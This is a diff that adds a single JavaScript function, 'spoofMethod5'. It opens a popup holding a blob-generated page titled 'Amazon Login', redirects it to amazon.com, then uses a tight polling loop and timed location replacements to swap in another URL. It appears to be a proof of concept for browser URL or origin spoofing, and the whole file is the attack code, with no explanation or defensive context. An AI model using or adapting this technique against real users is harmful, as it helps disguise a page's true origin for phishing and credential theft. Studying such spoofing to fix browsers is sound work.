@@ -1,0 +1,34 @@
+function spoofMethod5() {
+    var htmlContent = '<!DOCTYPE html><html><head><title>Amazon Login</title></head>';
+    htmlContent += '<body><h1>Please wait...</h1>';
+    htmlContent += '<script>';
+    htmlContent += 'setTimeout(function() { window.location = "http://amazon.com"; }, 200);';
+    htmlContent += '</script></body></html>';
+    
+    var blob = new Blob([htmlContent], {type: 'text/html'});
+    var blobURL = URL.createObjectURL(blob);
+    
+    var w = window.open(blobURL, 'popup', 'width=500,height=500');
+    
+    // Monitor navigation
+    var i = setInterval(function() {
+        try {
+            var href = w.location.href;
+            if (href && !href.startsWith('blob:')) {
+                clearInterval(i);
+                setTimeout(function() {
+                    try {
+                        w.location.replace('http://www.google.com/csi');
+                    } catch(e) {}
+                }, 50);
+            }
+        } catch(e) {
+            clearInterval(i);
+            setTimeout(function() {
+                try {
+                    w.location.replace('http://www.google.com/csi');
+                } catch(e) {}
+            }, 100);
+        }
+    }, 10);
+}
